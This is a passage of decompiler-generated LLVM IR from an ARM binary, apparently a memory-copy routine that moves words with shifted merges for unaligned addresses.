  %v4_14cc8 = inttoptr i32 %v3_14cc8 to i32*
  %v5_14cc8 = load i32, i32* %v4_14cc8, align 4
  store i32 %v5_14cc8, i32* %r5.global-to-local, align 4
  %v6_14cc8 = add i32 %v0_14cc8, 8
  %v7_14cc8 = inttoptr i32 %v6_14cc8 to i32*
  %v8_14cc8 = load i32, i32* %v7_14cc8, align 4
  store i32 %v8_14cc8, i32* %ip.global-to-local, align 4
  %v9_14cc8 = add i32 %v0_14cc8, 12
  %v10_14cc8 = inttoptr i32 %v9_14cc8 to i32*
  %v11_14cc8 = load i32, i32* %v10_14cc8, align 4
  store i32 %v11_14cc8, i32* @lr, align 4
  %v12_14cc8 = add i32 %v0_14cc8, 16
  store i32 %v12_14cc8, i32* %r1.global-to-local, align 4
  %v4_14ccc = mul i32 %v2_14cc8, 65536
  %v5_14ccc = or i32 %v4_14ccc, %v3_14cc4
  store i32 %v5_14ccc, i32* %r3.global-to-local, align 4
  %v3_14cd0 = udiv i32 %v2_14cc8, 65536
  %v4_14cd4 = mul i32 %v5_14cc8, 65536
  %v5_14cd4 = or i32 %v4_14cd4, %v3_14cd0
  store i32 %v5_14cd4, i32* %r4.global-to-local, align 4
  %v3_14cd8 = udiv i32 %v5_14cc8, 65536
  %v4_14cdc = mul i32 %v8_14cc8, 65536
  %v5_14cdc = or i32 %v4_14cdc, %v3_14cd8
  store i32 %v5_14cdc, i32* %r5.global-to-local, align 4
  %v3_14ce0 = udiv i32 %v8_14cc8, 65536
  %v4_14ce4 = mul i32 %v11_14cc8, 65536
  %v5_14ce4 = or i32 %v4_14ce4, %v3_14ce0
  store i32 %v5_14ce4, i32* @ip, align 4
  %v1_14ce8 = inttoptr i32 %v0_14ce8 to i32*
  store i32 %v5_14ccc, i32* %v1_14ce8, align 4
  %v3_14ce8 = add i32 %v0_14ce8, 4
  %v4_14ce8 = inttoptr i32 %v3_14ce8 to i32*
  %v5_14ce8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_14ce8, i32* %v4_14ce8, align 4
  %v6_14ce8 = add i32 %v0_14ce8, 8
  %v7_14ce8 = inttoptr i32 %v6_14ce8 to i32*
  %v8_14ce8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_14ce8, i32* %v7_14ce8, align 4
  %v9_14ce8 = add i32 %v0_14ce8, 12
  %v10_14ce8 = inttoptr i32 %v9_14ce8 to i32*
  %v11_14ce8 = load i32, i32* @ip, align 4
  store i32 %v11_14ce8, i32* %v10_14ce8, align 4
  %v12_14ce8 = add i32 %v0_14ce8, 16
  store i32 %v12_14ce8, i32* %r0.global-to-local, align 4
  %v0_14cec = load i32, i32* %r2.global-to-local, align 4
  %v2_14cec = add i32 %v0_14cec, -16
  store i32 %v2_14cec, i32* %r2.global-to-local, align 4
  %v6_14cf0 = icmp slt i32 %v0_14cec, 16
  br i1 %v6_14cf0, label %dec_label_pc_14cf4, label %dec_label_pc_14cc4.dec_label_pc_14cc4_crit_edge

dec_label_pc_14cc4.dec_label_pc_14cc4_crit_edge:  ; preds = %dec_label_pc_14cc4
  %v0_14cc4.pre = load i32, i32* @lr, align 4
  %v0_14cc8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14cc4

dec_label_pc_14cf4:                               ; preds = %dec_label_pc_14cc4
  %v2_14cf4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14cf4, i32* @r4, align 4
  %v5_14cf4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_14cf4, i32* @r5, align 4
  %v2_14cf8 = add i32 %v0_14cec, -4
  store i32 %v2_14cf8, i32* %r2.global-to-local, align 4
  %v4_14cf8 = add i32 %v0_14cec, 2147483632
  %v5_14cf8 = and i32 %v2_14cf8, %v4_14cf8
  %v6_14cf8 = icmp slt i32 %v5_14cf8, 0
  store i1 %v6_14cf8, i1* %cpsr_v.global-to-local, align 1
  %v7_14cf8 = icmp slt i32 %v2_14cf8, 0
  store i1 %v7_14cf8, i1* %cpsr_n.global-to-local, align 1
  %v5_14cfc = icmp slt i32 %v2_14cec, -12
  br i1 %v5_14cfc, label %dec_label_pc_14d18, label %dec_label_pc_14d00

dec_label_pc_14d00:                               ; preds = %dec_label_pc_14cf4, %dec_label_pc_14cb4, %dec_label_pc_14d00
  %v1_14d0c = phi i32 [ %v4_14d0c, %dec_label_pc_14d00 ], [ %v12_14ce8, %dec_label_pc_14cf4 ], [ %v0_14c7c75, %dec_label_pc_14cb4 ]
  %v0_14d00 = load i32, i32* @lr, align 4
  %v3_14d00 = udiv i32 %v0_14d00, 65536
  store i32 %v3_14d00, i32* %ip.global-to-local, align 4
  %v0_14d04 = load i32, i32* %r1.global-to-local, align 4
  %v1_14d04 = inttoptr i32 %v0_14d04 to i32*
  %v2_14d04 = load i32, i32* %v1_14d04, align 4
  store i32 %v2_14d04, i32* @lr, align 4
  %v4_14d04 = add i32 %v0_14d04, 4
  store i32 %v4_14d04, i32* %r1.global-to-local, align 4
  %v4_14d08 = mul i32 %v2_14d04, 65536
  %v5_14d08 = or i32 %v4_14d08, %v3_14d00
  store i32 %v5_14d08, i32* @ip, align 4
  %v2_14d0c = inttoptr i32 %v1_14d0c to i32*
  store i32 %v5_14d08, i32* %v2_14d0c, align 4
  %v3_14d0c = load i32, i32* %r0.global-to-local, align 4
  %v4_14d0c = add i32 %v3_14d0c, 4
  store i32 %v4_14d0c, i32* %r0.global-to-local, align 4
  %v0_14d10 = load i32, i32* %r2.global-to-local, align 4
  %v2_14d10 = add i32 %v0_14d10, -4
  store i32 %v2_14d10, i32* %r2.global-to-local, align 4
  %v6_14d14 = icmp slt i32 %v0_14d10, 4
  br i1 %v6_14d14, label %dec_label_pc_14d18.loopexit, label %dec_label_pc_14d00

dec_label_pc_14d18.loopexit:                      ; preds = %dec_label_pc_14d00
  %v4_14d10 = sub i32 3, %v0_14d10
  %v5_14d10 = and i32 %v4_14d10, %v0_14d10
  %v6_14d10 = icmp slt i32 %v5_14d10, 0
  %v7_14d10 = icmp slt i32 %v2_14d10, 0
  store i1 %v6_14d10, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_14d10, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_14d18

dec_label_pc_14d18:                               ; preds = %dec_label_pc_14d18.loopexit, %dec_label_pc_14cf4
  %v2_14bec112 = phi i32 [ %v4_14d0c, %dec_label_pc_14d18.loopexit ], [ %v12_14ce8, %dec_label_pc_14cf4 ]
  %v0_14bdc108 = phi i32 [ %v2_14d10, %dec_label_pc_14d18.loopexit ], [ %v2_14cf8, %dec_label_pc_14cf4 ]
  %v0_14d18 = load i32, i32* %r1.global-to-local, align 4
  %v1_14d18 = add i32 %v0_14d18, -2
  store i32 %v1_14d18, i32* @r1, align 4
  br label %bb133

dec_label_pc_14d20:                               ; preds = %dec_label_pc_14c34
  br i1 %v5_14d24, label %dec_label_pc_14d6c, label %dec_label_pc_14d28

dec_label_pc_14d28:                               ; preds = %dec_label_pc_14d20
  store i32 %v2_14d20, i32* %r2.global-to-local, align 4
  %v3_14d2c = load i32, i32* @r4, align 4
  store i32 %v3_14d2c, i32* %stack_var_-16, align 4
  %v6_14d2c = load i32, i32* @r5, align 4
  store i32 %v6_14d2c, i32* %stack_var_-12, align 4
  br label %dec_label_pc_14d30

dec_label_pc_14d30:                               ; preds = %dec_label_pc_14d30.dec_label_pc_14d30_crit_edge, %dec_label_pc_14d28
  %v0_14d54 = phi i32 [ %v12_14d54, %dec_label_pc_14d30.dec_label_pc_14d30_crit_edge ], [ %v0_14c7c75, %dec_label_pc_14d28 ]
  %v0_14d34 = phi i32 [ %v0_14d34.pre, %dec_label_pc_14d30.dec_label_pc_14d30_crit_edge ], [ %v4_14c38, %dec_label_pc_14d28 ]
  %v0_14d30 = phi i32 [ %v0_14d30.pre, %dec_label_pc_14d30.dec_label_pc_14d30_crit_edge ], [ %v2_14c38, %dec_label_pc_14d28 ]
  %v3_14d30 = udiv i32 %v0_14d30, 16777216
  store i32 %v3_14d30, i32* %r3.global-to-local, align 4
  %v1_14d34 = inttoptr i32 %v0_14d34 to i32*
  %v2_14d34 = load i32, i32* %v1_14d34, align 4
  store i32 %v2_14d34, i32* %r4.global-to-local, align 4
  %v3_14d34 = add i32 %v0_14d34, 4
  %v4_14d34 = inttoptr i32 %v3_14d34 to i32*
  %v5_14d34 = load i32, i32* %v4_14d34, align 4
  store i32 %v5_14d34, i32* %r5.global-to-local, align 4
  %v6_14d34 = add i32 %v0_14d34, 8
  %v7_14d34 = inttoptr i32 %v6_14d34 to i32*
  %v8_14d34 = load i32, i32* %v7_14d34, align 4
  store i32 %v8_14d34, i32* %ip.global-to-local, align 4
  %v9_14d34 = add i32 %v0_14d34, 12
  %v10_14d34 = inttoptr i32 %v9_14d34 to i32*
  %v11_14d34 = load i32, i32* %v10_14d34, align 4
  store i32 %v11_14d34, i32* @lr, align 4
  %v12_14d34 = add i32 %v0_14d34, 16
  store i32 %v12_14d34, i32* %r1.global-to-local, align 4
  %v4_14d38 = mul i32 %v2_14d34, 256
  %v5_14d38 = or i32 %v4_14d38, %v3_14d30
  store i32 %v5_14d38, i32* %r3.global-to-local, align 4
  %v3_14d3c = udiv i32 %v2_14d34, 16777216
  %v4_14d40 = mul i32 %v5_14d34, 256
  %v5_14d40 = or i32 %v4_14d40, %v3_14d3c
  store i32 %v5_14d40, i32* %r4.global-to-local, align 4
  %v3_14d44 = udiv i32 %v5_14d34, 16777216
  %v4_14d48 = mul i32 %v8_14d34, 256
  %v5_14d48 = or i32 %v4_14d48, %v3_14d44
  store i32 %v5_14d48, i32* %r5.global-to-local, align 4
  %v3_14d4c = udiv i32 %v8_14d34, 16777216
  %v4_14d50 = mul i32 %v11_14d34, 256
  %v5_14d50 = or i32 %v4_14d50, %v3_14d4c
  store i32 %v5_14d50, i32* @ip, align 4
  %v1_14d54 = inttoptr i32 %v0_14d54 to i32*
  store i32 %v5_14d38, i32* %v1_14d54, align 4
  %v3_14d54 = add i32 %v0_14d54, 4
  %v4_14d54 = inttoptr i32 %v3_14d54 to i32*
  %v5_14d54 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_14d54, i32* %v4_14d54, align 4
  %v6_14d54 = add i32 %v0_14d54, 8
  %v7_14d54 = inttoptr i32 %v6_14d54 to i32*
  %v8_14d54 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_14d54, i32* %v7_14d54, align 4
  %v9_14d54 = add i32 %v0_14d54, 12
  %v10_14d54 = inttoptr i32 %v9_14d54 to i32*
  %v11_14d54 = load i32, i32* @ip, align 4
  store i32 %v11_14d54, i32* %v10_14d54, align 4
  %v12_14d54 = add i32 %v0_14d54, 16
  store i32 %v12_14d54, i32* %r0.global-to-local, align 4
  %v0_14d58 = load i32, i32* %r2.global-to-local, align 4
  %v2_14d58 = add i32 %v0_14d58, -16
  store i32 %v2_14d58, i32* %r2.global-to-local, align 4
  %v6_14d5c = icmp slt i32 %v0_14d58, 16
  br i1 %v6_14d5c, label %dec_label_pc_14d60, label %dec_label_pc_14d30.dec_label_pc_14d30_crit_edge

dec_label_pc_14d30.dec_label_pc_14d30_crit_edge:  ; preds = %dec_label_pc_14d30
  %v0_14d30.pre = load i32, i32* @lr, align 4
  %v0_14d34.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14d30

dec_label_pc_14d60:                               ; preds = %dec_label_pc_14d30
  %v2_14d60 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14d60, i32* @r4, align 4
  %v5_14d60 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_14d60, i32* @r5, align 4
  %v2_14d64 = add i32 %v0_14d58, -4
  store i32 %v2_14d64, i32* %r2.global-to-local, align 4
  %v4_14d64 = add i32 %v0_14d58, 2147483632
  %v5_14d64 = and i32 %v2_14d64, %v4_14d64
  %v6_14d64 = icmp slt i32 %v5_14d64, 0
  store i1 %v6_14d64, i1* %cpsr_v.global-to-local, align 1
  %v7_14d64 = icmp slt i32 %v2_14d64, 0
  store i1 %v7_14d64, i1* %cpsr_n.global-to-local, align 1
  %v5_14d68 = icmp slt i32 %v2_14d58, -12
  br i1 %v5_14d68, label %dec_label_pc_14d84, label %dec_label_pc_14d6c

dec_label_pc_14d6c:                               ; preds = %dec_label_pc_14d60, %dec_label_pc_14d20, %dec_label_pc_14d6c
  %v1_14d78 = phi i32 [ %v4_14d78, %dec_label_pc_14d6c ], [ %v12_14d54, %dec_label_pc_14d60 ], [ %v0_14c7c75, %dec_label_pc_14d20 ]
  %v0_14d6c = load i32, i32* @lr, align 4
  %v3_14d6c = udiv i32 %v0_14d6c, 16777216
  store i32 %v3_14d6c, i32* %ip.global-to-local, align 4
  %v0_14d70 = load i32, i32* %r1.global-to-local, align 4
  %v1_14d70 = inttoptr i32 %v0_14d70 to i32*
  %v2_14d70 = load i32, i32* %v1_14d70, align 4
  store i32 %v2_14d70, i32* @lr, align 4
  %v4_14d70 = add i32 %v0_14d70, 4
  store i32 %v4_14d70, i32* %r1.global-to-local, align 4
  %v4_14d74 = mul i32 %v2_14d70, 256
  %v5_14d74 = or i32 %v4_14d74, %v3_14d6c
  store i32 %v5_14d74, i32* @ip, align 4
  %v2_14d78 = inttoptr i32 %v1_14d78 to i32*
  store i32 %v5_14d74, i32* %v2_14d78, align 4
  %v3_14d78 = load i32, i32* %r0.global-to-local, align 4
  %v4_14d78 = add i32 %v3_14d78, 4
  store i32 %v4_14d78, i32* %r0.global-to-local, align 4
  %v0_14d7c = load i32, i32* %r2.global-to-local, align 4
  %v2_14d7c = add i32 %v0_14d7c, -4
  store i32 %v2_14d7c, i32* %r2.global-to-local, align 4
  %v6_14d80 = icmp slt i32 %v0_14d7c, 4
  br i1 %v6_14d80, label %dec_label_pc_14d84.loopexit, label %dec_label_pc_14d6c

dec_label_pc_14d84.loopexit:                      ; preds = %dec_label_pc_14d6c
  %v4_14d7c = sub i32 3, %v0_14d7c
  %v5_14d7c = and i32 %v4_14d7c, %v0_14d7c
  %v6_14d7c = icmp slt i32 %v5_14d7c, 0
  %v7_14d7c = icmp slt i32 %v2_14d7c, 0
  store i1 %v6_14d7c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_14d7c, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_14d84

dec_label_pc_14d84:                               ; preds = %dec_label_pc_14d84.loopexit, %dec_label_pc_14d60
  %v2_14bec114 = phi i32 [ %v4_14d78, %dec_label_pc_14d84.loopexit ], [ %v12_14d54, %dec_label_pc_14d60 ]
  %v0_14bdc110 = phi i32 [ %v2_14d7c, %dec_label_pc_14d84.loopexit ], [ %v2_14d64, %dec_label_pc_14d60 ]
  %v0_14d84 = load i32, i32* %r1.global-to-local, align 4
  %v1_14d84 = add i32 %v0_14d84, -1
  store i32 %v1_14d84, i32* @r1, align 4
  br label %bb133

dec_label_pc_14d8c:                               ; preds = %entry
  %v1_14d8c = load i32, i32* @r2, align 4
  %v2_14d8c = add i32 %v1_14d8c, %v0_14b40
  store i32 %v2_14d8c, i32* @r1, align 4
  %v2_14d90 = add i32 %v1_14d8c, %v1_14b40
  store i32 %v2_14d90, i32* %r0.global-to-local, align 4
  %v2_14d94 = add i32 %v1_14d8c, -4
  store i32 %v2_14d94, i32* %r2.global-to-local, align 4
  %v4_14d94 = sub i32 3, %v1_14d8c
  %v5_14d94 = and i32 %v4_14d94, %v1_14d8c
  %v6_14d94 = icmp slt i32 %v5_14d94, 0
  store i1 %v6_14d94, i1* %cpsr_v.global-to-local, align 1
  %v7_14d94 = icmp slt i32 %v2_14d94, 0
  store i1 %v7_14d94, i1* %cpsr_n.global-to-local, align 1
  %v5_14d98 = icmp slt i32 %v1_14d8c, 4
  br i1 %v5_14d98, label %bb143, label %dec_label_pc_14d9c

dec_label_pc_14d9c:                               ; preds = %dec_label_pc_14d8c
  %v1_14d9c = urem i32 %v2_14d90, 4
  store i32 %v1_14d9c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_14d9c = icmp eq i32 %v1_14d9c, 0
  br i1 %v2_14d9c, label %dec_label_pc_14da4, label %dec_label_pc_14e44

dec_label_pc_14da4:                               ; preds = %dec_label_pc_14d9c
  %v1_14da4 = urem i32 %v2_14d8c, 4
  store i32 %v1_14da4, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_14da4 = icmp eq i32 %v1_14da4, 0
  br i1 %v2_14da4, label %dec_label_pc_14dac, label %dec_label_pc_14e70

dec_label_pc_14dac:                               ; preds = %dec_label_pc_14da4, %dec_label_pc_14e68
  %v0_14dc449 = phi i32 [ %v2_14d90, %dec_label_pc_14da4 ], [ %v0_14eb832, %dec_label_pc_14e68 ]
  %v0_14dc048 = phi i32 [ %v2_14d8c, %dec_label_pc_14da4 ], [ %v0_14e68, %dec_label_pc_14e68 ]
  %v0_14dac = phi i32 [ %v2_14d94, %dec_label_pc_14da4 ], [ %v2_14e60, %dec_label_pc_14e68 ]
  %v2_14dac = add i32 %v0_14dac, -8
  store i32 %v2_14dac, i32* %r2.global-to-local, align 4
  %v4_14dac = sub i32 7, %v0_14dac
  %v5_14dac = and i32 %v4_14dac, %v0_14dac
  %v6_14dac = icmp slt i32 %v5_14dac, 0
  store i1 %v6_14dac, i1* %cpsr_v.global-to-local, align 1
  %v7_14dac = icmp slt i32 %v2_14dac, 0
  store i1 %v7_14dac, i1* %cpsr_n.global-to-local, align 1
  %v5_14db0 = icmp slt i32 %v0_14dac, 8
  br i1 %v5_14db0, label %dec_label_pc_14dfc, label %dec_label_pc_14db4

dec_label_pc_14db4:                               ; preds = %dec_label_pc_14dac
  %v3_14db4 = load i32, i32* @r4, align 4
  %v5_14db4 = inttoptr i32 %v3_14db4 to i8*
  store i8* %v5_14db4, i8** %stack_var_-8, align 4
  %v8_14db4 = load i32, i32* @lr, align 4
  %v2_14db8 = add i32 %v0_14dac, -28
  store i32 %v2_14db8, i32* %r2.global-to-local, align 4
  %v4_14db8 = sub i32 27, %v0_14dac
  %v5_14db8 = and i32 %v4_14db8, %v2_14dac
  %v6_14db8 = icmp slt i32 %v5_14db8, 0
  store i1 %v6_14db8, i1* %cpsr_v.global-to-local, align 1
  %v7_14db8 = icmp slt i32 %v2_14db8, 0
  store i1 %v7_14db8, i1* %cpsr_n.global-to-local, align 1
  %v5_14dbc = icmp slt i32 %v2_14dac, 20
  br i1 %v5_14dbc, label %dec_label_pc_14dd8, label %dec_label_pc_14dc0

dec_label_pc_14dc0:                               ; preds = %dec_label_pc_14db4, %dec_label_pc_14dc0.dec_label_pc_14dc0_crit_edge
  %v0_14dc4 = phi i32 [ %v1_14dcc, %dec_label_pc_14dc0.dec_label_pc_14dc0_crit_edge ], [ %v0_14dc449, %dec_label_pc_14db4 ]
  %v0_14dc0 = phi i32 [ %v0_14dc0.pre, %dec_label_pc_14dc0.dec_label_pc_14dc0_crit_edge ], [ %v0_14dc048, %dec_label_pc_14db4 ]
  %v1_14dc0 = add i32 %v0_14dc0, -4
  %v2_14dc0 = inttoptr i32 %v1_14dc0 to i32*
  %v3_14dc0 = load i32, i32* %v2_14dc0, align 4
  store i32 %v3_14dc0, i32* %r3.global-to-local, align 4
  %v4_14dc0 = add i32 %v0_14dc0, -8
  %v5_14dc0 = inttoptr i32 %v4_14dc0 to i32*
  %v6_14dc0 = load i32, i32* %v5_14dc0, align 4
  store i32 %v6_14dc0, i32* %r4.global-to-local, align 4
  %v7_14dc0 = add i32 %v0_14dc0, -12
  %v8_14dc0 = inttoptr i32 %v7_14dc0 to i32*
  %v9_14dc0 = load i32, i32* %v8_14dc0, align 4
  store i32 %v9_14dc0, i32* %ip.global-to-local, align 4
  %v10_14dc0 = add i32 %v0_14dc0, -16
  %v11_14dc0 = inttoptr i32 %v10_14dc0 to i32*
  %v12_14dc0 = load i32, i32* %v11_14dc0, align 4
  store i32 %v12_14dc0, i32* %lr.global-to-local, align 4
  store i32 %v10_14dc0, i32* %r1.global-to-local, align 4
  %v1_14dc4 = add i32 %v0_14dc4, -16
  %v2_14dc4 = inttoptr i32 %v1_14dc4 to i32*
  store i32 %v3_14dc0, i32* %v2_14dc4, align 4
  %v4_14dc4 = add i32 %v0_14dc4, -12
  %v5_14dc4 = inttoptr i32 %v4_14dc4 to i32*
  %v6_14dc4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_14dc4, i32* %v5_14dc4, align 4
  %v7_14dc4 = add i32 %v0_14dc4, -8
  %v8_14dc4 = inttoptr i32 %v7_14dc4 to i32*
  %v9_14dc4 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_14dc4, i32* %v8_14dc4, align 4
  %v10_14dc4 = add i32 %v0_14dc4, -4
  %v11_14dc4 = inttoptr i32 %v10_14dc4 to i32*
  %v12_14dc4 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_14dc4, i32* %v11_14dc4, align 4
  store i32 %v1_14dc4, i32* %r0.global-to-local, align 4
  %v0_14dc8 = load i32, i32* %r1.global-to-local, align 4
  %v1_14dc8 = add i32 %v0_14dc8, -4
  %v2_14dc8 = inttoptr i32 %v1_14dc8 to i32*
  %v3_14dc8 = load i32, i32* %v2_14dc8, align 4
  store i32 %v3_14dc8, i32* %r3.global-to-local, align 4
  %v4_14dc8 = add i32 %v0_14dc8, -8
  %v5_14dc8 = inttoptr i32 %v4_14dc8 to i32*
  %v6_14dc8 = load i32, i32* %v5_14dc8, align 4
  store i32 %v6_14dc8, i32* %r4.global-to-local, align 4
  %v7_14dc8 = add i32 %v0_14dc8, -12
  %v8_14dc8 = inttoptr i32 %v7_14dc8 to i32*
  %v9_14dc8 = load i32, i32* %v8_14dc8, align 4
  store i32 %v9_14dc8, i32* @ip, align 4
  %v10_14dc8 = add i32 %v0_14dc8, -16
  %v11_14dc8 = inttoptr i32 %v10_14dc8 to i32*
  %v12_14dc8 = load i32, i32* %v11_14dc8, align 4
  store i32 %v12_14dc8, i32* %lr.global-to-local, align 4
  store i32 %v10_14dc8, i32* @r1, align 4
  %v1_14dcc = add i32 %v0_14dc4, -32
  %v2_14dcc = inttoptr i32 %v1_14dcc to i32*
  store i32 %v3_14dc8, i32* %v2_14dcc, align 4
  %v4_14dcc = add i32 %v0_14dc4, -28
  %v5_14dcc = inttoptr i32 %v4_14dcc to i32*
  %v6_14dcc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_14dcc, i32* %v5_14dcc, align 4
  %v7_14dcc = add i32 %v0_14dc4, -24
  %v8_14dcc = inttoptr i32 %v7_14dcc to i32*
  %v9_14dcc = load i32, i32* @ip, align 4
  store i32 %v9_14dcc, i32* %v8_14dcc, align 4
  %v10_14dcc = add i32 %v0_14dc4, -20
  %v11_14dcc = inttoptr i32 %v10_14dcc to i32*
  %v12_14dcc = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_14dcc, i32* %v11_14dcc, align 4
  store i32 %v1_14dcc, i32* %r0.global-to-local, align 4
  %v0_14dd0 = load i32, i32* %r2.global-to-local, align 4
  %v2_14dd0 = add i32 %v0_14dd0, -32
  store i32 %v2_14dd0, i32* %r2.global-to-local, align 4
  %v6_14dd4 = icmp slt i32 %v0_14dd0, 32
  br i1 %v6_14dd4, label %dec_label_pc_14dd8.loopexit, label %dec_label_pc_14dc0.dec_label_pc_14dc0_crit_edge

dec_label_pc_14dc0.dec_label_pc_14dc0_crit_edge:  ; preds = %dec_label_pc_14dc0
  %v0_14dc0.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_14dc0

dec_label_pc_14dd8.loopexit:                      ; preds = %dec_label_pc_14dc0
  %v4_14dd0 = sub i32 31, %v0_14dd0
  %v5_14dd0 = and i32 %v4_14dd0, %v0_14dd0
  %v6_14dd0 = icmp slt i32 %v5_14dd0, 0
  %v7_14dd0 = icmp slt i32 %v2_14dd0, 0
  store i1 %v6_14dd0, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_14dd0, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_14dd8

dec_label_pc_14dd8:                               ; preds = %dec_label_pc_14dd8.loopexit, %dec_label_pc_14db4
  %v6_14de0 = phi i32 [ %v1_14dcc, %dec_label_pc_14dd8.loopexit ], [ %v0_14dc449, %dec_label_pc_14db4 ]
  %v0_14de8.pr = phi i32 [ %v2_14dd0, %dec_label_pc_14dd8.loopexit ], [ %v2_14db8, %dec_label_pc_14db4 ]
  %v4_14dd8 = add i32 %v0_14de8.pr, 16
  %v6_14dd8 = sub i32 0, %v0_14de8.pr
  %v7_14dd8 = and i32 %v4_14dd8, %v6_14dd8
  %v8_14dd8 = icmp slt i32 %v7_14dd8, 0
  store i1 %v8_14dd8, i1* %cpsr_v.global-to-local, align 1
  %v9_14dd8 = icmp slt i32 %v4_14dd8, 0
  store i1 %v9_14dd8, i1* %cpsr_n.global-to-local, align 1
  %v5_14ddc = icmp slt i32 %v0_14de8.pr, -16
  br i1 %v5_14ddc, label %.thread14, label %bb140

bb140:                                            ; preds = %dec_label_pc_14dd8
  %v6_14ddc = load i32, i32* @r1, align 4
  %v7_14ddc = add i32 %v6_14ddc, -4
  %v8_14ddc = inttoptr i32 %v7_14ddc to i32*
  %v9_14ddc = load i32, i32* %v8_14ddc, align 4
  store i32 %v9_14ddc, i32* %r3.global-to-local, align 4
  %v10_14ddc = add i32 %v6_14ddc, -8
  %v11_14ddc = inttoptr i32 %v10_14ddc to i32*
  %v12_14ddc = load i32, i32* %v11_14ddc, align 4
  store i32 %v12_14ddc, i32* %r4.global-to-local, align 4
  %v13_14ddc = add i32 %v6_14ddc, -12
  %v14_14ddc = inttoptr i32 %v13_14ddc to i32*
  %v15_14ddc = load i32, i32* %v14_14ddc, align 4
  store i32 %v15_14ddc, i32* @ip, align 4
  %v16_14ddc = add i32 %v6_14ddc, -16
  %v17_14ddc = inttoptr i32 %v16_14ddc to i32*
  %v18_14ddc = load i32, i32* %v17_14ddc, align 4
  store i32 %v18_14ddc, i32* %lr.global-to-local, align 4
  store i32 %v16_14ddc, i32* @r1, align 4
  %v7_14de0 = add i32 %v6_14de0, -16
  %v8_14de0 = inttoptr i32 %v7_14de0 to i32*
  store i32 %v9_14ddc, i32* %v8_14de0, align 4
  %v10_14de0 = add i32 %v6_14de0, -12
  %v11_14de0 = inttoptr i32 %v10_14de0 to i32*
  %v12_14de0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_14de0, i32* %v11_14de0, align 4
  %v13_14de0 = add i32 %v6_14de0, -8
  %v14_14de0 = inttoptr i32 %v13_14de0 to i32*
  %v15_14de0 = load i32, i32* @ip, align 4
  store i32 %v15_14de0, i32* %v14_14de0, align 4
  %v16_14de0 = add i32 %v6_14de0, -4
  %v17_14de0 = inttoptr i32 %v16_14de0 to i32*
  %v18_14de0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_14de0, i32* %v17_14de0, align 4
  store i32 %v7_14de0, i32* %r0.global-to-local, align 4
  %v6_14de4 = load i32, i32* %r2.global-to-local, align 4
  %v7_14de4 = add i32 %v6_14de4, -16
  store i32 %v7_14de4, i32* %r2.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_14dd8, %bb140
  %v6_14df0 = phi i32 [ %v7_14de0, %bb140 ], [ %v6_14de0, %dec_label_pc_14dd8 ]
  %v0_14de8 = phi i32 [ %v7_14de4, %bb140 ], [ %v0_14de8.pr, %dec_label_pc_14dd8 ]
  %v4_14de8 = add i32 %v0_14de8, 20
  store i32 %v4_14de8, i32* %r2.global-to-local, align 4
  %v6_14de8 = sub i32 0, %v0_14de8
  %v7_14de8 = and i32 %v4_14de8, %v6_14de8
  %v8_14de8 = icmp slt i32 %v7_14de8, 0
  store i1 %v8_14de8, i1* %cpsr_v.global-to-local, align 1
  %v9_14de8 = icmp slt i32 %v4_14de8, 0
  store i1 %v9_14de8, i1* %cpsr_n.global-to-local, align 1
  %v5_14dec = icmp slt i32 %v0_14de8, -20
  br i1 %v5_14dec, label %.thread16, label %bb141

bb141:                                            ; preds = %.thread14
  %v6_14dec = load i32, i32* @r1, align 4
  %v7_14dec = add i32 %v6_14dec, -4
  %v8_14dec = inttoptr i32 %v7_14dec to i32*
  %v9_14dec = load i32, i32* %v8_14dec, align 4
  store i32 %v9_14dec, i32* %r3.global-to-local, align 4
  %v10_14dec = add i32 %v6_14dec, -8
  %v11_14dec = inttoptr i32 %v10_14dec to i32*
  %v12_14dec = load i32, i32* %v11_14dec, align 4
  store i32 %v12_14dec, i32* @ip, align 4
  %v13_14dec = add i32 %v6_14dec, -12
  %v14_14dec = inttoptr i32 %v13_14dec to i32*
  %v15_14dec = load i32, i32* %v14_14dec, align 4
  store i32 %v15_14dec, i32* %lr.global-to-local, align 4
  store i32 %v13_14dec, i32* @r1, align 4
  %v7_14df0 = add i32 %v6_14df0, -12
  %v8_14df0 = inttoptr i32 %v7_14df0 to i32*
  store i32 %v9_14dec, i32* %v8_14df0, align 4
  %v10_14df0 = add i32 %v6_14df0, -8
  %v11_14df0 = inttoptr i32 %v10_14df0 to i32*
  %v12_14df0 = load i32, i32* @ip, align 4
  store i32 %v12_14df0, i32* %v11_14df0, align 4
  %v13_14df0 = add i32 %v6_14df0, -4
  %v14_14df0 = inttoptr i32 %v13_14df0 to i32*
  %v15_14df0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_14df0, i32* %v14_14df0, align 4
  store i32 %v7_14df0, i32* %r0.global-to-local, align 4
  %v6_14df4 = load i32, i32* %r2.global-to-local, align 4
  %v7_14df4 = add i32 %v6_14df4, -12
  store i32 %v7_14df4, i32* %r2.global-to-local, align 4
  br label %.thread16

.thread16:                                        ; preds = %.thread14, %bb141
